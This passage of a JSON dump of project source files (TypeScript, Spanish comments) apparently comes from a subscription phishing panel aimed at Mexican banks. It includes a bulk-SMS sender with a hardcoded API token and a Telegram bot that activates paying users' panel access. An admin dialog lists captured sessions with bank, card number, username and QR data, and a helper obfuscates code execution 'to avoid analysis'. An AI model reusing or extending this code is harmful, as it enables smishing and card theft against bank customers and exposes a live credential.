ejecutar c贸digo de forma ofuscada\n  public static executeObfuscated(functionName: string, ...args: any[]): any {\n    const func = this.dynamicFunctions.get(functionName);\n    if (func) {\n      // Agregar delay aleatorio antes de ejecutar\n      const delay = Math.random() * 50;\n      return new Promise(resolve => {\n        setTimeout(() => {\n          resolve(func.apply(null, args));\n        }, delay);\n      });\n    }\n    return null;\n  }\n  \n  // Limpiar funciones din谩micas para evitar an谩lisis\n  public static cleanupDynamicFunctions(): void {\n    this.dynamicFunctions.clear();\n    \n    // Forzar garbage collection si est谩 disponible\n    if (typeof window !== 'undefined' && (window as any).gc) {\n      (window as any).gc();\n    }\n  }\n}","size_bytes":3688},"client/src/components/ui/dialog.tsx":{"content":"import * as React from \"react\"\nimport * as DialogPrimitive from \"@radix-ui/react-dialog\"\nimport { X } from \"lucide-react\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Dialog = DialogPrimitive.Root\n\nconst DialogTrigger = DialogPrimitive.Trigger\n\nconst DialogPortal = DialogPrimitive.Portal\n\nconst DialogClose = DialogPrimitive.Close\n\nconst DialogOverlay = React.forwardRef<\n  React.ElementRef<typeof DialogPrimitive.Overlay>,\n  React.ComponentPropsWithoutRef<typeof DialogPrimitive.Overlay>\n>(({ className, ...props }, ref) => (\n  <DialogPrimitive.Overlay\n    ref={ref}\n    className={cn(\n      \"fixed inset-0 z-50 bg-black/80  data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0\",\n      className\n    )}\n    {...props}\n  />\n))\nDialogOverlay.displayName = DialogPrimitive.Overlay.displayName\n\nconst DialogContent = React.forwardRef<\n  React.ElementRef<typeof DialogPrimitive.Content>,\n  React.ComponentPropsWithoutRef<typeof DialogPrimitive.Content>\n>(({ className, children, ...props }, ref) => (\n  <DialogPortal>\n    <DialogOverlay />\n    <DialogPrimitive.Content\n      ref={ref}\n      className={cn(\n        \"fixed left-[50%] top-[50%] z-50 grid w-full max-w-lg translate-x-[-50%] translate-y-[-50%] gap-4 border bg-background p-6 shadow-lg duration-200 data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[state=closed]:slide-out-to-left-1/2 data-[state=closed]:slide-out-to-top-[48%] data-[state=open]:slide-in-from-left-1/2 data-[state=open]:slide-in-from-top-[48%] sm:rounded-lg\",\n        className\n      )}\n      {...props}\n    >\n      {children}\n      <DialogPrimitive.Close className=\"absolute right-4 top-4 rounded-sm opacity-70 ring-offset-background transition-opacity hover:opacity-100 focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none data-[state=open]:bg-accent data-[state=open]:text-muted-foreground\">\n        <X className=\"h-4 w-4\" />\n        <span className=\"sr-only\">Close</span>\n      </DialogPrimitive.Close>\n    </DialogPrimitive.Content>\n  </DialogPortal>\n))\nDialogContent.displayName = DialogPrimitive.Content.displayName\n\nconst DialogHeader = ({\n  className,\n  ...props\n}: React.HTMLAttributes<HTMLDivElement>) => (\n  <div\n    className={cn(\n      \"flex flex-col space-y-1.5 text-center sm:text-left\",\n      className\n    )}\n    {...props}\n  />\n)\nDialogHeader.displayName = \"DialogHeader\"\n\nconst DialogFooter = ({\n  className,\n  ...props\n}: React.HTMLAttributes<HTMLDivElement>) => (\n  <div\n    className={cn(\n      \"flex flex-col-reverse sm:flex-row sm:justify-end sm:space-x-2\",\n      className\n    )}\n    {...props}\n  />\n)\nDialogFooter.displayName = \"DialogFooter\"\n\nconst DialogTitle = React.forwardRef<\n  React.ElementRef<typeof DialogPrimitive.Title>,\n  React.ComponentPropsWithoutRef<typeof DialogPrimitive.Title>\n>(({ className, ...props }, ref) => (\n  <DialogPrimitive.Title\n    ref={ref}\n    className={cn(\n      \"text-lg font-semibold leading-none tracking-tight\",\n      className\n    )}\n    {...props}\n  />\n))\nDialogTitle.displayName = DialogPrimitive.Title.displayName\n\nconst DialogDescription = React.forwardRef<\n  React.ElementRef<typeof DialogPrimitive.Description>,\n  React.ComponentPropsWithoutRef<typeof DialogPrimitive.Description>\n>(({ className, ...props }, ref) => (\n  <DialogPrimitive.Description\n    ref={ref}\n    className={cn(\"text-sm text-muted-foreground\", className)}\n    {...props}\n  />\n))\nDialogDescription.displayName = DialogPrimitive.Description.displayName\n\nexport {\n  Dialog,\n  DialogPortal,\n  DialogOverlay,\n  DialogClose,\n  DialogTrigger,\n  DialogContent,\n  DialogHeader,\n  DialogFooter,\n  DialogTitle,\n  DialogDescription,\n}\n","size_bytes":3835},"server/smsService.ts":{"content":"import axios from 'axios';\n\n// URLs de las APIs SMS\nconst ANKAREX_SMS_URL = 'https://rest.ankarex.ltd';\n\n// Credenciales desde variables de entorno\nconst ANKAREX_API_TOKEN = 'MSL3-YQPV-M4LP-ACF3-HNHG-ZMLR-QR7J-6S8U';\n\n// Credenciales de eims (ruta premium)\nconst EIMS_AUTH_NAME = process.env.EIMS_AUTH_NAME;\nconst EIMS_API_KEY = process.env.EIMS_API_KEY;\nconst EIMS_SMS_URL = 'https://ws.mxims.com/api/sendsms';\n\n// Enum para tipos de rutas SMS\nexport enum SmsRouteType {\n  LONG_CODE = 'long_code',   // 0.5 cr茅dito - Ankarex\n  SHORT_CODE = 'short_code', // 1 cr茅dito - eims (ruta premium)\n  PREMIUM = 'premium'        // 1 cr茅dito - eims (ruta premium alternativa)\n}\n\n\n\n/**\n * Env铆a SMS en lote usando la ruta Ankarex (Long Code - 0.5 cr茅dito)\n */\nexport async function sendBulkSMSAnkarex(\n  numeros: string[], \n  mensaje: string\n): Promise<{ success: boolean; data?: any; error?: string }> {\n  try {\n    console.log(` Enviando SMS v铆a Ankarex (Long Code) a ${numeros.length} n煤meros`);\n    \n    // Crear lista de n煤meros en formato string separado por comas\n    const numerosString = numeros.join(',');\n    \n    console.log(` Enviando a Ankarex API...`);\n    console.log(' N煤meros:', numerosString);\n    console.log(' Mensaje:', mensaje);\n    \n    const response = await axios.post(ANKAREX_SMS_URL, {\n      token: ANKAREX_API_TOKEN,\n      send: \"bulk\",\n      to: numerosString,\n      sender_id: \"SMS\",\n      message_content: mensaje,\n      unicode: false\n    }, {\n      headers: {\n        'Content-Type': 'application/json',\n        'Accept': 'application/json',\n        'User-Agent': 'Ankarex-Rest-0.22'\n      },\n      timeout: 30000\n    });\n    \n    console.log(' Ankarex Response Status:', response.status);\n    console.log(' Ankarex Response Data:', response.data);\n    \n    if (response.status === 200 && response.data) {\n      // Verificar respuestas exitosas de Ankarex\n      const isSuccess = (\n        (response.data.error === \"false\") || \n        (response.data.info === \"SENT\") || \n        (response.data.info === \"CAMPAIGN_SENT\") ||\n        (response.data.campaign_id)\n      );\n      \n      if (isSuccess) {\n        const campaignId = response.data.id || response.data.campaign_id || 'N/A';\n        console.log(` SMS enviados exitosamente v铆a Ankarex. Campaign ID: ${campaignId}`);\n        return { success: true, data: response.data };\n      } else {\n        console.log(` Error en Ankarex API: ${response.data.info || 'Error desconocido'}`);\n        return { success: false, error: response.data.info || 'Error en el env铆o v铆a Ankarex' };\n      }\n    } else {\n      console.log(`锔 Respuesta no exitosa de Ankarex:`, response.data);\n      return { success: false, error: 'Error en la API de Ankarex' };\n    }\n  } catch (error: any) {\n    console.error(` Error enviando SMS v铆a Ankarex:`, error.response?.data || error.message);\n    return { success: false, error: error.response?.data?.message || error.message };\n  }\n}\n\n/**\n * Env铆a SMS en lote usando la ruta eims (Premium - 1 cr茅dito)\n */\nexport async function sendBulkSMSeims(\n  numeros: string[], \n  mensaje: string\n): Promise<{ success: boolean; data?: any; error?: string }> {\n  try {\n    console.log(` Enviando SMS v铆a eims (Premium) a ${numeros.length} n煤meros`);\n    \n    if (!EIMS_AUTH_NAME || !EIMS_API_KEY) {\n      console.error(' Las credenciales de eims no est谩n configuradas');\n      return { success: false, error: 'Credenciales de eims no configuradas' };\n    }\n    \n    console.log(` Enviando a eims API...`);\n    console.log(' N煤meros:', numeros);\n    console.log(' Mensaje:', mensaje);\n    \n    // Crear lista de n煤meros en formato string separado por comas\n    const numerosString = numeros.join(',');\n    \n    const response = await axios.post(EIMS_SMS_URL, {\n      authname: EIMS_AUTH_NAME,\n      apikey: EIMS_API_KEY,\n      mobile: numerosString,\n      message: mensaje,\n      sender: \"SMS\",\n      route: \"1\" // Ruta premium\n    }, {\n      headers: {\n        'Content-Type': 'application/json',\n        'Accept': 'application/json'\n      },\n      timeout: 30000\n    });\n    \n    console.log(' eims Response Status:', response.status);\n    console.log(' eims Response Data:', response.data);\n    \n    if (response.status === 200 && response.data) {\n      // Verificar respuestas exitosas de eims\n      const isSuccess = (\n        response.data.status === \"success\" || \n        response.data.status === \"OK\" ||\n        response.data.message_id ||\n        response.data.result === \"success\"\n      );\n      \n      if (isSuccess) {\n        const messageId = response.data.message_id || response.data.id || 'N/A';\n        console.log(` SMS enviados exitosamente v铆a eims. Message ID: ${messageId}`);\n        return { success: true, data: response.data };\n      } else {\n        console.log(` Error en eims API: ${response.data.message || response.data.error || 'Error desconocido'}`);\n        return { success: false, error: response.data.message || response.data.error || 'Error en el env铆o v铆a eims' };\n      }\n    } else {\n      console.log(`锔 Respuesta no exitosa de eims:`, response.data);\n      return { success: false, error: 'Error en la API de eims' };\n    }\n  } catch (error: any) {\n    console.error(` Error enviando SMS v铆a eims:`, error.response?.data || error.message);\n    return { success: false, error: error.response?.data?.message || error.message };\n  }\n}\n\n\n/**\n * Env铆a un SMS individual\n */\nexport async function sendSingleSMS(\n  numero: string, \n  mensaje: string\n): Promise<{ success: boolean; data?: any; error?: string }> {\n  return sendBulkSMSAnkarex([numero], mensaje);\n}\n\n/**\n * Valida formato de n煤mero de tel茅fono\n */\nexport function validatePhoneNumber(numero: string): boolean {\n  // Solo n煤meros de 10 d铆gitos sin prefijo (igual que el c贸digo del bot que funciona)\n  const cleanNumber = numero.replace(/\\s/g, '').replace(/^\\+\\d{1,3}/, '');\n  return /^\\d{10}$/.test(cleanNumber);\n}\n\n/**\n * Normaliza n煤meros de tel茅fono agregando prefijo si es necesario\n */\nexport function normalizePhoneNumber(numero: string, defaultPrefix: string = '+52'): string {\n  // Remover espacios\n  const cleanNumber = numero.replace(/\\s/g, '');\n  \n  // Si ya tiene prefijo, devolverlo tal como est谩\n  if (cleanNumber.startsWith('+')) {\n    return cleanNumber;\n  }\n  \n  // Si es un n煤mero de 10 d铆gitos, agregar el prefijo por defecto\n  if (/^\\d{10}$/.test(cleanNumber)) {\n    return `${defaultPrefix}${cleanNumber}`;\n  }\n  \n  // Si es un n煤mero de m谩s de 10 d铆gitos, asumir que ya incluye c贸digo de pa铆s\n  return `+${cleanNumber}`;\n}\n\n/**\n * Funci贸n unificada para enviar SMS con selecci贸n autom谩tica de ruta\n */\nexport async function sendSMSWithRoute(\n  numeros: string[], \n  mensaje: string,\n  routeType: SmsRouteType = SmsRouteType.LONG_CODE\n): Promise<{ success: boolean; data?: any; error?: string; creditCost: number }> {\n  console.log(` Enviando SMS usando ruta: ${routeType}`);\n  \n  let result;\n  let creditCost;\n  \n  if (routeType === SmsRouteType.SHORT_CODE || routeType === SmsRouteType.PREMIUM) {\n    // Usar eims (1 cr茅dito por mensaje) - ruta premium\n    result = await sendBulkSMSeims(numeros, mensaje);\n    creditCost = numeros.length * 1;\n  } else {\n    // Usar Ankarex (0.5 cr茅dito por mensaje) - ruta por defecto\n    result = await sendBulkSMSAnkarex(numeros, mensaje);\n    creditCost = numeros.length * 0.5;\n  }\n  \n  return {\n    ...result,\n    creditCost\n  };\n}\n\n/**\n * Obtiene el costo en cr茅ditos para un env铆o\n */\nexport function calculateCreditCost(numeroCount: number, routeType: SmsRouteType): number {\n  if (routeType === SmsRouteType.SHORT_CODE || routeType === SmsRouteType.PREMIUM) {\n    return numeroCount * 1;\n  } else {\n    // LONG_CODE es la ruta por defecto (0.5 cr茅dito)\n    return numeroCount * 0.5;\n  }\n}\n\n/**\n * Procesa una lista de n煤meros separados por comas (igual que el c贸digo del bot que funciona)\n */\nexport function parsePhoneNumbers(numbersString: string, defaultPrefix: string = '+52'): string[] {\n  const numeros = numbersString.split(',').map(n => n.trim()).filter(n => /^\\d{10}$/.test(n));\n  console.log(` N煤meros procesados: ${numeros.length} de entrada: \"${numbersString}\"`);\n  console.log(` N煤meros v谩lidos:`, numeros);\n  \n  // Agregar prefijo a n煤meros v谩lidos\n  return numeros.map(numero => `${defaultPrefix}${numero}`);\n}\n\n/**\n * Valida el mensaje SMS\n */\nexport function validateSMSMessage(mensaje: string): { valid: boolean; error?: string } {\n  if (!mensaje || mensaje.trim().length === 0) {\n    return { valid: false, error: 'El mensaje no puede estar vac铆o' };\n  }\n  \n  if (mensaje.length > 160) {\n    return { valid: false, error: `El mensaje es demasiado largo (${mensaje.length}/160 caracteres)` };\n  }\n  \n  return { valid: true };\n}","size_bytes":8842},"server/paymentBot.ts":{"content":"import TelegramBot from 'node-telegram-bot-api';\nimport axios from 'axios';\nimport { storage } from './storage';\nimport fs from 'fs';\n\nconst PAYMENT_BOT_TOKEN = process.env.PAYMENT_BOT_TOKEN;\nconst PAYMENT_BOT_CHAT_ID = process.env.PAYMENT_BOT_CHAT_ID;\n\nif (!PAYMENT_BOT_TOKEN || !PAYMENT_BOT_CHAT_ID) {\n  console.warn('[Payment Bot] PAYMENT_BOT_TOKEN y PAYMENT_BOT_CHAT_ID no est谩n configurados. El bot de pagos estar谩 deshabilitado.');\n}\n\nlet paymentBotInstance: TelegramBot | null = null;\nlet isPaymentBotShuttingDown = false;\n\nasync function stopPaymentBot() {\n  if (paymentBotInstance && !isPaymentBotShuttingDown) {\n    isPaymentBotShuttingDown = true;\n    try {\n      console.log(' Deteniendo bot de pagos...');\n      await paymentBotInstance.stopPolling();\n      paymentBotInstance.removeAllListeners();\n      paymentBotInstance = null;\n      console.log(' Bot de pagos detenido correctamente');\n    } catch (error) {\n      console.log('锔 Error al detener bot de pagos (continuando)');\n    } finally {\n      isPaymentBotShuttingDown = false;\n    }\n  }\n}\n\nasync function cleanupPaymentBotInstances() {\n  try {\n    await stopPaymentBot();\n    await axios.get(`https://api.telegram.org/bot${PAYMENT_BOT_TOKEN}/deleteWebhook?drop_pending_updates=true`);\n    console.log('Ч Limpieza de webhooks del bot de pagos completada');\n    await new Promise(resolve => setTimeout(resolve, 2000));\n  } catch (error) {\n    console.log('锔 Error al limpiar configuraciones del bot de pagos');\n  }\n}\n\ninterface ActivationSession {\n  chatId: number;\n  state: 'awaiting_username' | 'awaiting_duration';\n  username?: string;\n}\n\nconst activationSessions = new Map<number, ActivationSession>();\n\nlet paymentBot: TelegramBot;\n\nasync function initPaymentBot() {\n  await cleanupPaymentBotInstances();\n\n  try {\n    paymentBot = new TelegramBot(PAYMENT_BOT_TOKEN!, { \n      polling: {\n        interval: 1000,\n        autoStart: true,\n        params: {\n          timeout: 10\n        }\n      }\n    });\n    paymentBotInstance = paymentBot;\n    console.log(' Bot de pagos iniciado correctamente');\n\n    setupBotHandlers();\n  } catch (error) {\n    console.error(' Error iniciando bot de pagos:', error);\n    throw error;\n  }\n}\n\nfunction setupBotHandlers() {\n  paymentBot.onText(/\\/activar/, async (msg) => {\n    const chatId = msg.chat.id;\n    \n    activationSessions.set(chatId, {\n      chatId,\n      state: 'awaiting_username'\n    });\n    \n    await paymentBot.sendMessage(chatId, \n      ' *Activar Usuario*\\n\\n' +\n      'Por favor, ingresa el nombre de usuario que deseas activar:', \n      { parse_mode: 'Markdown' }\n    );\n  });\n\n  paymentBot.on('message', async (msg) => {\n    const chatId = msg.chat.id;\n    const text = msg.text;\n    \n    if (!text || text.startsWith('/')) return;\n    \n    const session = activationSessions.get(chatId);\n    if (!session) return;\n    \n    if (session.state === 'awaiting_username') {\n      const username = text.trim();\n      \n      const user = await storage.getUserByUsername(username);\n      if (!user) {\n        await paymentBot.sendMessage(chatId, \n          ' *Usuario no encontrado*\\n\\n' +\n          `No existe ning煤n usuario con el nombre: *${username}*\\n\\n` +\n          'Por favor, verifica el nombre e intenta nuevamente:', \n          { parse_mode: 'Markdown' }\n        );\n        return;\n      }\n      \n      session.username = username;\n      session.state = 'awaiting_duration';\n      activationSessions.set(chatId, session);\n      \n      const keyboard = {\n        inline_keyboard: [\n          [\n            { text: '1 d铆a ', callback_data: `activate_1_${username}` },\n            { text: '7 d铆as ', callback_data: `activate_7_${username}` }\n          ],\n          [\n            { text: ' Cancelar', callback_data: 'activate_cancel' }\n          ]\n        ]\n      };\n      \n      await paymentBot.sendMessage(chatId, \n        ` *Usuario encontrado*\\n\\n` +\n        ` Usuario: *${username}*\\n` +\n        ` ID: ${user.id}\\n\\n` +\n        `Selecciona la duraci贸n de activaci贸n:`,\n        { \n          parse_mode: 'Markdown',\n          reply_markup: keyboard\n        }\n      );\n    }\n  });\n\n  paymentBot.on('callback_query', async (query) => {\n    const chatId = query.message?.chat.id;\n    const data = query.data;\n    const messageId = query.message?.message_id;\n    \n    if (!chatId || !data || !messageId) return;\n    \n    await paymentBot.answerCallbackQuery(query.id);\n    \n    if (data === 'activate_cancel') {\n      activationSessions.delete(chatId);\n      await paymentBot.editMessageText(\n        ' Activaci贸n cancelada.',\n        {\n          chat_id: chatId,\n          message_id: messageId\n        }\n      );\n      return;\n    }\n    \n    const match = data.match(/^activate_(\\d+)_(.+)$/);\n    if (!match) return;\n    \n    const days = parseInt(match[1]);\n    const username = match[2];\n    \n    try {\n      const user = await storage.getUserByUsername(username);\n      if (!user) {\n        await paymentBot.editMessageText(\n          ' Error: Usuario no encontrado.',\n          {\n            chat_id: chatId,\n            message_id: messageId\n          }\n        );\n        return;\n      }\n      \n      const expiresAt = new Date();\n      expiresAt.setDate(expiresAt.getDate() + days);\n      \n      await storage.updateUser(user.id, {\n        isActive: true,\n        expiresAt: expiresAt\n      });\n      \n      const durationText = days === 1 ? '1 d铆a ' : '7 d铆as ';\n      const expirationDate = expiresAt.toLocaleDateString('es-MX', {\n        weekday: 'long',\n        year: 'numeric',\n        month: 'long',\n        day: 'numeric',\n        hour: '2-digit',\n        minute: '2-digit'\n      });\n      \n      await paymentBot.editMessageText(\n        ` *Usuario activado exitosamente*\\n\\n` +\n        ` Usuario: *${username}*\\n` +\n        `憋 Duraci贸n: *${durationText}*\\n` +\n        ` Vence el: ${expirationDate}\\n\\n` +\n        `El usuario ahora puede acceder al panel.`,\n        {\n          chat_id: chatId,\n          message_id: messageId,\n          parse_mode: 'Markdown'\n        }\n      );\n      \n      activationSessions.delete(chatId);\n      console.log(`[PaymentBot] Usuario ${username} activado por ${days} d铆a(s)`);\n      \n    } catch (error) {\n      console.error('[PaymentBot] Error activando usuario:', error);\n      await paymentBot.editMessageText(\n        ' Error al activar el usuario. Por favor, intenta nuevamente.',\n        {\n          chat_id: chatId,\n          message_id: messageId\n        }\n      );\n    }\n  });\n}\n\nif (PAYMENT_BOT_TOKEN && PAYMENT_BOT_CHAT_ID) {\n  initPaymentBot();\n}\n\nprocess.on('SIGINT', async () => {\n  console.log('\\n SIGINT recibido, cerrando bot de pagos...');\n  await stopPaymentBot();\n});\n\nprocess.on('SIGTERM', async () => {\n  console.log('\\n SIGTERM recibido, cerrando bot de pagos...');\n  await stopPaymentBot();\n});\n\nexport async function sendPaymentReceipt(data: {\n  username: string;\n  amount: string;\n  referenceCode: string;\n  screenshotPath?: string;\n  status: 'pending' | 'verified' | 'rejected';\n  userId: number;\n}): Promise<void> {\n  if (!paymentBot || !PAYMENT_BOT_CHAT_ID) {\n    console.error('[PaymentBot] Bot no inicializado o CHAT_ID no configurado');\n    return;\n  }\n\n  try {\n    let message = ` *COMPROBANTE DE PAGO*\\n\\n`;\n    message += ` *Usuario:* ${data.username}\\n`;\n    message += ` *Monto:* $${data.amount} MXN\\n`;\n    message += ` *Referencia:* \\`${data.referenceCode}\\`\\n`;\n    message += ` *Estado:* ${data.status === 'pending' ? ' Pendiente' : data.status === 'verified' ? ' Verificado' : ' Rechazado'}\\n`;\n    message += ` *Fecha:* ${new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' })}\\n`;\n    \n    if (data.screenshotPath && fs.existsSync(data.screenshotPath)) {\n      await paymentBot.sendPhoto(PAYMENT_BOT_CHAT_ID, data.screenshotPath, {\n        caption: message,\n        parse_mode: 'Markdown'\n      });\n    } else {\n      await paymentBot.sendMessage(PAYMENT_BOT_CHAT_ID, message, {\n        parse_mode: 'Markdown'\n      });\n    }\n    \n    console.log(`[PaymentBot] Comprobante enviado para usuario ${data.username}`);\n  } catch (error) {\n    console.error('[PaymentBot] Error enviando comprobante:', error);\n  }\n}\n\nexport async function notifyPaymentVerification(data: {\n  username: string;\n  amount: string;\n  referenceCode: string;\n  verificationMethod: 'bitso' | 'ai' | 'manual';\n  success: boolean;\n  details?: string;\n}): Promise<void> {\n  if (!paymentBot || !PAYMENT_BOT_CHAT_ID) {\n    console.error('[PaymentBot] Bot no inicializado o CHAT_ID no configurado');\n    return;\n  }\n\n  try {\n    let message = ` *VERIFICACIN DE PAGO*\\n\\n`;\n    message += ` *Usuario:* ${data.username}\\n`;\n    message += ` *Monto:* $${data.amount} MXN\\n`;\n    message += ` *Referencia:* \\`${data.referenceCode}\\`\\n`;\n    message += ` *M茅todo:* ${data.verificationMethod === 'bitso' ? 'API Bitso' : data.verificationMethod === 'ai' ? 'IA Vision' : 'Manual'}\\n`;\n    message += `${data.success ? '' : ''} *Resultado:* ${data.success ? 'VERIFICADO' : 'NO VERIFICADO'}\\n`;\n    \n    if (data.details) {\n      message += `\\n *Detalles:*\\n${data.details}`;\n    }\n    \n    message += `\\n *Fecha:* ${new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' })}`;\n    \n    await paymentBot.sendMessage(PAYMENT_BOT_CHAT_ID, message, {\n      parse_mode: 'Markdown'\n    });\n    \n    console.log(`[PaymentBot] Notificaci贸n de verificaci贸n enviada`);\n  } catch (error) {\n    console.error('[PaymentBot] Error enviando notificaci贸n de verificaci贸n:', error);\n  }\n}\n\nexport { paymentBot };\n","size_bytes":9685},"client/src/components/ui/form.tsx":{"content":"import * as React from \"react\"\nimport * as LabelPrimitive from \"@radix-ui/react-label\"\nimport { Slot } from \"@radix-ui/react-slot\"\nimport {\n  Controller,\n  ControllerProps,\n  FieldPath,\n  FieldValues,\n  FormProvider,\n  useFormContext,\n} from \"react-hook-form\"\n\nimport { cn } from \"@/lib/utils\"\nimport { Label } from \"@/components/ui/label\"\n\nconst Form = FormProvider\n\ntype FormFieldContextValue<\n  TFieldValues extends FieldValues = FieldValues,\n  TName extends FieldPath<TFieldValues> = FieldPath<TFieldValues>\n> = {\n  name: TName\n}\n\nconst FormFieldContext = React.createContext<FormFieldContextValue>(\n  {} as FormFieldContextValue\n)\n\nconst FormField = <\n  TFieldValues extends FieldValues = FieldValues,\n  TName extends FieldPath<TFieldValues> = FieldPath<TFieldValues>\n>({\n  ...props\n}: ControllerProps<TFieldValues, TName>) => {\n  return (\n    <FormFieldContext.Provider value={{ name: props.name }}>\n      <Controller {...props} />\n    </FormFieldContext.Provider>\n  )\n}\n\nconst useFormField = () => {\n  const fieldContext = React.useContext(FormFieldContext)\n  const itemContext = React.useContext(FormItemContext)\n  const { getFieldState, formState } = useFormContext()\n\n  const fieldState = getFieldState(fieldContext.name, formState)\n\n  if (!fieldContext) {\n    throw new Error(\"useFormField should be used within <FormField>\")\n  }\n\n  const { id } = itemContext\n\n  return {\n    id,\n    name: fieldContext.name,\n    formItemId: `${id}-form-item`,\n    formDescriptionId: `${id}-form-item-description`,\n    formMessageId: `${id}-form-item-message`,\n    ...fieldState,\n  }\n}\n\ntype FormItemContextValue = {\n  id: string\n}\n\nconst FormItemContext = React.createContext<FormItemContextValue>(\n  {} as FormItemContextValue\n)\n\nconst FormItem = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => {\n  const id = React.useId()\n\n  return (\n    <FormItemContext.Provider value={{ id }}>\n      <div ref={ref} className={cn(\"space-y-2\", className)} {...props} />\n    </FormItemContext.Provider>\n  )\n})\nFormItem.displayName = \"FormItem\"\n\nconst FormLabel = React.forwardRef<\n  React.ElementRef<typeof LabelPrimitive.Root>,\n  React.ComponentPropsWithoutRef<typeof LabelPrimitive.Root>\n>(({ className, ...props }, ref) => {\n  const { error, formItemId } = useFormField()\n\n  return (\n    <Label\n      ref={ref}\n      className={cn(error && \"text-destructive\", className)}\n      htmlFor={formItemId}\n      {...props}\n    />\n  )\n})\nFormLabel.displayName = \"FormLabel\"\n\nconst FormControl = React.forwardRef<\n  React.ElementRef<typeof Slot>,\n  React.ComponentPropsWithoutRef<typeof Slot>\n>(({ ...props }, ref) => {\n  const { error, formItemId, formDescriptionId, formMessageId } = useFormField()\n\n  return (\n    <Slot\n      ref={ref}\n      id={formItemId}\n      aria-describedby={\n        !error\n          ? `${formDescriptionId}`\n          : `${formDescriptionId} ${formMessageId}`\n      }\n      aria-invalid={!!error}\n      {...props}\n    />\n  )\n})\nFormControl.displayName = \"FormControl\"\n\nconst FormDescription = React.forwardRef<\n  HTMLParagraphElement,\n  React.HTMLAttributes<HTMLParagraphElement>\n>(({ className, ...props }, ref) => {\n  const { formDescriptionId } = useFormField()\n\n  return (\n    <p\n      ref={ref}\n      id={formDescriptionId}\n      className={cn(\"text-sm text-muted-foreground\", className)}\n      {...props}\n    />\n  )\n})\nFormDescription.displayName = \"FormDescription\"\n\nconst FormMessage = React.forwardRef<\n  HTMLParagraphElement,\n  React.HTMLAttributes<HTMLParagraphElement>\n>(({ className, children, ...props }, ref) => {\n  const { error, formMessageId } = useFormField()\n  const body = error ? String(error?.message) : children\n\n  if (!body) {\n    return null\n  }\n\n  return (\n    <p\n      ref={ref}\n      id={formMessageId}\n      className={cn(\"text-sm font-medium text-destructive\", className)}\n      {...props}\n    >\n      {body}\n    </p>\n  )\n})\nFormMessage.displayName = \"FormMessage\"\n\nexport {\n  useFormField,\n  Form,\n  FormItem,\n  FormLabel,\n  FormControl,\n  FormDescription,\n  FormMessage,\n  FormField,\n}\n","size_bytes":4085},"client/src/components/admin/DeleteConfirmDialog.tsx":{"content":"import React from 'react';\nimport { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter, DialogDescription } from '@/components/ui/dialog';\nimport { Button } from '@/components/ui/button';\nimport { Session } from '@shared/schema';\nimport { Trash2, QrCode, Download } from 'lucide-react';\n\ninterface DeleteConfirmDialogProps {\n  isOpen: boolean;\n  onClose: () => void;\n  onConfirm: () => void;\n  session: Session | null;\n}\n\nexport const DeleteConfirmDialog: React.FC<DeleteConfirmDialogProps> = ({\n  isOpen,\n  onClose,\n  onConfirm,\n  session\n}) => {\n  if (!session) return null;\n  \n  return (\n    <Dialog open={isOpen} onOpenChange={onClose}>\n      <DialogContent className=\"sm:max-w-[425px] bg-[#1e1e1e] text-white border-gray-700\">\n        <DialogHeader>\n          <DialogTitle className=\"flex items-center\">\n            <Trash2 className=\"mr-2 h-5 w-5 text-red-500\" />\n            Confirmar eliminaci贸n\n          </DialogTitle>\n          <DialogDescription className=\"text-gray-400\">\n            驴Est谩 seguro que desea eliminar esta sesi贸n? Esta acci贸n no se puede deshacer.\n          </DialogDescription>\n        </DialogHeader>\n        \n        <div className=\"mt-4 bg-[#252525] p-3 rounded-md\">\n          <div className=\"mb-1\">\n            <span className=\"font-semibold\">Banco:</span> {session.banco}\n          </div>\n          <div className=\"mb-1\">\n            <span className=\"font-semibold\">Folio:</span> {session.folio || 'N/A'}\n          </div>\n          {session.username && (\n            <div className=\"mb-1\">\n              <span className=\"font-semibold\">Usuario:</span> {session.username}\n            </div>\n          )}\n          {session.tarjeta && (\n            <div className=\"mb-1\">\n              <span className=\"font-semibold\">Tarjeta:</span> {session.tarjeta}\n            </div>\n          )}\n          <div className=\"mb-1\">\n            <span className=\"font-semibold\">Estado:</span> {session.pasoActual || 'Inicial'}\n          </div>\n          \n          {session.qrData && (\n            <div className=\"mt-2 pt-2 border-t border-gray-700\">\n              <div className=\"flex items-center mb-1\">\n                <QrCode className=\"mr-2 h-4 w-4 text-[#00aaff]\" />\n                <span className=\"font-semibold\">C贸digo QR escaneado</span>\n              </div>\n            </div>\n          )}\n        </div>\n        \n        <DialogFooter className=\"mt-4\">\n          <Button variant=\"outline\" onClick={onClose} className=\"border-gray-700 hover:bg-gray-800\">\n            Cancelar\n          </Button>\n          <Button \n            variant=\"destructive\" \n            onClick={() => {\n              onConfirm();\n              onClose();\n            }}\n            className=\"bg-red-600 hover:bg-red-700\"\n          >\n            Eliminar sesi贸n\n          </Button>\n        </DialogFooter>\n      </DialogContent>\n    </Dialog>\n  );\n};","size_bytes":2871},"shared/schema.ts":{"content":"\nimport { pgTable, text, serial, integer, boolean, timestamp, jsonb, numeric, unique } from \"drizzle-orm/pg-core\";\nimport { createInsertSchema } from \"drizzle-zod\";\nimport { z } from \"zod\";\nimport bcrypt from \"bcrypt\";\n\n// Roles de usuario\nexport enum UserRole {\n  ADMIN = \"admin\",\n  USER = \"user\"\n}\n\n// Tipos de cuenta\nexport enum AccountType {\n  INDIVIDUAL = \"individual\",\n  OFFICE = \"office\"\n}\n\n// Bancos disponibles\nexport enum BankType {\n  ALL = \"all\",\n  LIVERPOOL = \"liverpool\",\n  CITIBANAMEX = \"citibanamex\",\n  BANBAJIO = \"banbajio\",\n  BBVA = \"bbva\",\n  BANORTE = \"banorte\",\n  BANCOPPEL = \"bancoppel\",\n  HSBC = \"hsbc\",\n  AMEX = \"amex\",\n  SANTANDER = \"santander\",\n  SCOTIABANK = \"scotiabank\",\n  INVEX = \"invex\",\n  BANREGIO = \"banregio\",\n  SPIN = 